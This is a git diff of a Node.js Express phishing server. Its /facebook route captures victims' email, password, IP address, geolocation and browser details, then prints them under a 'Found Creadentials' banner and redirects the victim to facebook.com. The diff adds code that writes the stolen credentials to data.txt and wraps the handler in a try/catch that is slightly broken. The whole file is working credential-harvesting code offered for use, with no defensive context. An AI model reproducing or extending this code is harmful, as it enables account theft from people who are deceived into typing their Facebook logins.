@@ -3,7 +3,7 @@ const app = express();
 const geoip = require("geoip-lite"); // npm install --save geoip-lite
 const Sniffr = require("sniffr"); // npm install --save sniffr
 const requestIp = require("request-ip"); // npm install --save request-ip
-
+const fs = require("fs");
 
 const HOST = process.env.HOST || "0.0.0.0";
 const PORT = process.env.PORT || 3000;
@@ -28,25 +28,8 @@ app.post("/facebook", (req, res) => {
   res.statusCode = 200;
   res.setHeader("Content-Type", "application/json");
 
-  let data = JSON.stringify(
-    {
-      email,
-      password,
-      ...startSniff,
-      clientIp,
-      geo
-    },
-    null,
-    2
-  );
-
-  var parseData = JSON.parse(data);
-
-  console.log(
-    `
-     """"""""""""""""""""""""""" Found Creadentials """"""""""""""""""""""""""""""""" 
-    `,
-    JSON.stringify(
+  try {
+    let data = JSON.stringify(
       {
         email,
         password,
@@ -56,18 +39,43 @@ app.post("/facebook", (req, res) => {
       },
       null,
       2
-    )
-  );
+    );
 
-  console.table(parseData);
+    var parseData = JSON.parse(data);
 
-  console.log(
-    `
-    """"""""""""""""""""""""""" Waiting For Other Victim """""""""""""""""""""""""""""""""
-    `
-  );
+    console.log(
+      `
+       """"""""""""""""""""""""""" Found Creadentials """"""""""""""""""""""""""""""""" 
+      `,
+      JSON.stringify(
+        {
+          email,
+          password,
+          ...startSniff,
+          clientIp,
+          geo
+        },
+        null,
+        2
+      )
+    );
 
-  return res.redirect("http://www.facebook.com");
+    console.table(parseData);
+
+    fs.writeFileSync("data.txt", data);
+
+    console.log(
+      `
+      """"""""""""""""""""""""""" Waiting For Other Victim """""""""""""""""""""""""""""""""
+      `
+    );
+
+    return res.redirect("http://www.facebook.com");
+  } catch (err) {
+
+    console.log(err)
+  }
+  throw err;
 });
 
 app.listen(PORT, HOST, err => {
